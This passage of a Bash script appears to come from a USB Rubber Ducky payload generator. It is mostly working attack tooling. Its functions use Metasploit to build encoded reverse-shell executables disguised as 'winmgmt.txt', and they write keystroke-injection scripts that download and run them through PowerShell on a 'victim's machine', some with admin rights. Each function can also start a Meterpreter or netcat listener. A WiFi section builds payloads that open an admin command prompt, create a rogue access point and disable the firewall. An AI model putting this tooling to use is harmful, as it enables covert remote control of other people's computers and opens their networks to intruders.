	echo -e ""
	read -p "Would you like a meterpreter or netcat shell[met/nc]? " payloadtype
	clear
	echo -e "\e[1;34mMetasploit is generating your payload, this will take a moment...\e[0m"
	
	if [ "$payloadtype" == "met" ]; then
		msfpayload windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o /var/www/winmgmt.txt
	else 
		msfpayload windows/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o  /var/www/winmgmt.txt
	fi		
	
	echo -e ""
	echo -e "\e[1;34mDone!\e[0m"
    sleep 3
    clear
	echo -e "\e[1;34mNow let's build your inject.bin\e[0m"
	echo ""
	echo -e "\e[1;34mWhat is the IP/Domain address for your webserver?\e[0m" 
	read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mPlease wait, generating your inject.bin\e[0m"
	echo ""
	sed "/http/s/domain/$webserverip/g" /usr/share/ducky/encoder/payloads/powershellVIS7.conf > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	elif [ "$payloadtype" == "met" ]; then
		gnome-terminal -x msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E &
		nautilus /usr/share/ducky/encoder/ &
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		gnome-terminal -x nc -lvp $attackerport &
		nautilus /usr/share/ducky/encoder/
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	fi	
		
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac
}

#################################################################################
# Powershell Download & Execute w/UAC (Admin Priv Shell|Win Vista/7)
#################################################################################
f_powershellVIS7admuac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses Powershell to download and execute an evil payload"
	echo -e "\e[1;31mNote:\e[0m The evil payload is generated by Metasploit, and will provide ethier a Meterpreter or Standard Shell. The payload will automatically be dropped in your web (/var/www) directory and will be titled 'winmgmt.txt'. Once the payload is downloaded on the victim's machine it is converted to a .exe and run with Admin privileges."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m skysploit (Props to mubix for designing the orginal PD&E)"
	echo ""
	echo ""
	echo -e "\e[1;34mLets start by building your evil executable\e[0m"
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo -e ""
	read -p "Would you like a meterpreter or netcat shell[met/nc]? " payloadtype
	clear
	echo -e "\e[1;34mMetasploit is generating your payload, this will take a moment...\e[0m"
	
	if [ "$payloadtype" == "met" ]; then
		msfpayload windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o /var/www/winmgmt.txt
	else 
		msfpayload windows/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o  /var/www/winmgmt.txt
	fi		
	echo -e ""
	echo -e "\e[1;34mDone!\e[0m"
    sleep 3
    clear
	echo -e "\e[1;34mNow let's build your inject.bin\e[0m"
	echo ""
	echo -e "\e[1;34mWhat is the IP/Domain address for your webserver?\e[0m" 
	read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mPlease wait, generating your inject.bin\e[0m"
	echo ""
	sed "/http/s/domain/$webserverip/g" /usr/share/ducky/encoder/payloads/powershellVIS7admuac.conf > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter		
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	fi 	
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	elif [ "$payloadtype" == "met" ]; then
		gnome-terminal -x msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E &
		nautilus /usr/share/ducky/encoder/ &
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		gnome-terminal -x nc -lvp $attackerport &
		nautilus /usr/share/ducky/encoder/
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	fi	
		
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac
}

#################################################################################
# Powershell Download & Execute w/o UAC (Admin Priv Shell|Win Vista/7)
#################################################################################
f_powershellVIS7admnouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses Powershell to download and execute an evil payload"
	echo -e "\e[1;31mNote:\e[0m The evil payload is generated by Metasploit, and will provide ethier a Meterpreter or Standard Shell. The payload will automatically be dropped in your web (/var/www) directory and will be titled 'winmgmt.txt'. Once the payload is downloaded on the victim's machine it is converted to a .exe and run with Admin privileges."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m skysploit (Props to mubix for designing the orginal PD&E)"
	echo ""
	echo ""
	echo -e "\e[1;34mLets start by building your evil executable\e[0m"
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo -e ""
	read -p "Would you like a meterpreter or netcat shell[met/nc]? " payloadtype
	clear
	echo -e "\e[1;34mMetasploit is generating your payload, this will take a moment...\e[0m"
	
	if [ "$payloadtype" == "met" ]; then
		msfpayload windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o /var/www/winmgmt.txt
	else 
		msfpayload windows/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o  /var/www/winmgmt.txt
	fi		
	echo -e ""
	echo -e "\e[1;34mDone!\e[0m"
    sleep 3
    clear
	echo -e "\e[1;34mNow let's build your inject.bin\e[0m"
	echo ""
	echo -e "\e[1;34mWhat is the IP/Domain address for your webserver?\e[0m" 
	read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mPlease wait, generating your inject.bin\e[0m"
	echo ""
	sed "/http/s/domain/$webserverip/g" /usr/share/ducky/encoder/payloads/powershellVIS7admnouac.conf > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter		
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	fi 	
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	elif [ "$payloadtype" == "met" ]; then
		gnome-terminal -x msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E &
		nautilus /usr/share/ducky/encoder/ &
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		gnome-terminal -x nc -lvp $attackerport &
		nautilus /usr/share/ducky/encoder/
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	fi	
		
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac
}

#################################################################################
# Powershell Download & Execute (User Priv Shell|Win 8)
#################################################################################
f_powershellWIN8(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses Powershell to download and execute an evil payload"
	echo -e "\e[1;31mNote:\e[0m The evil payload is generated by Metasploit, and will provide either a Meterpreter or Standard shell. The payload will automatically be dropped in your web (/var/www) directory and will be titled 'winmgmt.txt'. Once the payload is downloaded on the victim's machine it is converted to a .exe and run with user privileges."
	echo -e "\e[1;31mTarget:\e[0m Windows 8"
	echo -e "\e[1;31mAuthor:\e[0m mubix"
	echo ""
	echo ""
	echo -e "\e[1;34mLets start by building your evil executable\e[0m"
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo -e ""
	read -p "Would you like a meterpreter or netcat shell[met/nc]? " payloadtype
	clear
	echo -e "\e[1;34mMetasploit is generating your payload, this will take a moment...\e[0m"
	
	if [ "$payloadtype" == "met" ]; then
		msfpayload windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o /var/www/winmgmt.txt
	else 
		msfpayload windows/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o  /var/www/winmgmt.txt
	fi		
	
	echo -e ""
	echo -e "\e[1;34mDone!\e[0m"
    sleep 3
    clear
	echo -e "\e[1;34mNow let's build your inject.bin\e[0m"
	echo ""
	echo -e "\e[1;34mWhat is the IP/Domain address for your webserver?\e[0m" 
	read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mPlease wait, generating your inject.bin\e[0m"
	echo ""
	sed "/http/s/domain/$webserverip/g" /usr/share/ducky/encoder/payloads/powershellWIN8.conf > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	elif [ "$payloadtype" == "met" ]; then
		gnome-terminal -x msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E &
		nautilus /usr/share/ducky/encoder/ &
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		gnome-terminal -x nc -lvp $attackerport &
		nautilus /usr/share/ducky/encoder/
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	fi	
		
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac
}

#################################################################################
# Powershell Download & Execute w/UAC (Admin Priv Shell|Win 8)
#################################################################################
f_powershellWIN8admuac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses Powershell to download and execute an evil payload"
	echo -e "\e[1;31mNote:\e[0m The evil payload is generated by Metasploit, and will provide ethier a Meterpreter or Standard Shell. The payload will automatically be dropped in your web (/var/www) directory and will be titled 'winmgmt.txt'. Once the payload is downloaded on the victim's machine it is converted to a .exe and run with Admin privileges."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m skysploit (Props to mubix for designing the orginal PD&E)"
	echo ""
	echo ""
	echo -e "\e[1;34mLets start by building your evil executable\e[0m"
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo -e ""
	read -p "Would you like a meterpreter or netcat shell[met/nc]? " payloadtype
	clear
	echo -e "\e[1;34mMetasploit is generating your payload, this will take a moment...\e[0m"
	
	if [ "$payloadtype" == "met" ]; then
		msfpayload windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o /var/www/winmgmt.txt
	else 
		msfpayload windows/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o  /var/www/winmgmt.txt
	fi		
	echo -e ""
	echo -e "\e[1;34mDone!\e[0m"
    sleep 3
    clear
	echo -e "\e[1;34mNow let's build your inject.bin\e[0m"
	echo ""
	echo -e "\e[1;34mWhat is the IP/Domain address for your webserver?\e[0m" 
	read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mPlease wait, generating your inject.bin\e[0m"
	echo ""
	sed "/http/s/domain/$webserverip/g" /usr/share/ducky/encoder/payloads/powershellWIN8admuac.conf > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	elif [ "$payloadtype" == "met" ]; then
		gnome-terminal -x msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E &
		nautilus /usr/share/ducky/encoder/ &
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		gnome-terminal -x nc -lvp $attackerport &
		nautilus /usr/share/ducky/encoder/
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	fi	
		
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac
}

#################################################################################
# Powershell Download & Execute w/o UAC (Admin Priv Shell|Win 8)
#################################################################################
f_powershellWIN8admnouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses Powershell to download and execute an evil payload"
	echo -e "\e[1;31mNote:\e[0m The evil payload is generated by Metasploit, and will provide ethier a Meterpreter or Standard Shell. The payload will automatically be dropped in your web (/var/www) directory and will be titled 'winmgmt.txt'. Once the payload is downloaded on the victim's machine it is converted to a .exe and run with Admin privileges."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m skysploit (Props to mubix for designing the orginal PD&E)"
	echo ""
	echo ""
	echo -e "\e[1;34mLets start by building your evil executable\e[0m"
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo -e ""
	read -p "Would you like a meterpreter or netcat shell[met/nc]? " payloadtype
	clear
	echo -e "\e[1;34mMetasploit is generating your payload, this will take a moment...\e[0m"
	
	if [ "$payloadtype" == "met" ]; then
		msfpayload windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o /var/www/winmgmt.txt
	else 
		msfpayload windows/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport R |  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o  /var/www/winmgmt.txt
	fi		
	echo -e ""
	echo -e "\e[1;34mDone!\e[0m"
    sleep 3
    clear
	echo -e "\e[1;34mNow let's build your inject.bin\e[0m"
	echo ""
	echo -e "\e[1;34mWhat is the IP/Domain address for your webserver?\e[0m" 
	read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mPlease wait, generating your inject.bin\e[0m"
	echo ""
	sed "/http/s/domain/$webserverip/g" /usr/share/ducky/encoder/payloads/powershellWIN8admnouac.conf > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter		
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.txt\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	elif [ "$payloadtype" == "met" ]; then
		gnome-terminal -x msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E &
		nautilus /usr/share/ducky/encoder/ &
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		gnome-terminal -x nc -lvp $attackerport &
		nautilus /usr/share/ducky/encoder/
		service apache2 start
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	fi	
		
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac
}

#################################################################################
#################################################################################
#
# Wifi Attacks
#
#################################################################################
#################################################################################

#################################################################################
# WiFi Backdoor w/UAC (Win Vista/7)
#################################################################################
f_wifibackdoorVIS7uac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload opens an Administrative cmd.exe session, then creates a wireless access point and disables the firewall"
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Darren Kitchen"
	echo ""
	echo ""
	echo -e ""
	read -p "What would you like the SSID to be? " attackerssid
	echo ""
	read -p "What would you like the AP's key to be? " attackerkey
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard languagee\e[0m"
	echo ""
	sed "/STRING/s/attackerssid/$attackerssid/g" /usr/share/ducky/encoder/payloads/wifibackdoorVIS7uac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerkey/$attackerkey/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	nautilus /usr/share/ducky/encoder/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Backdoor w/o UAC (Win Vista/7)
#################################################################################
f_wifibackdoorVIS7nouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload opens an Administrative cmd.exe session, then creates a wireless access point and disables the firewall"
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Darren Kitchen"
	echo ""
	echo ""
	echo -e ""
	read -p "What would you like the SSID to be? " attackerssid
	echo ""
	read -p "What would you like the AP's key to be? " attackerkey
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard languagee\e[0m"
	echo ""
	sed "/STRING/s/attackerssid/$attackerssid/g" /usr/share/ducky/encoder/payloads/wifibackdoorVIS7nouac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerkey/$attackerkey/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	nautilus /usr/share/ducky/encoder/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Backdoor w/UAC (Win 8)
#################################################################################
f_wifibackdoorWIN8uac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload opens an Administrative cmd.exe session, then creates a wireless access point and disables the firewall"
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Darren Kitchen"
	echo ""
	echo ""
	echo -e ""
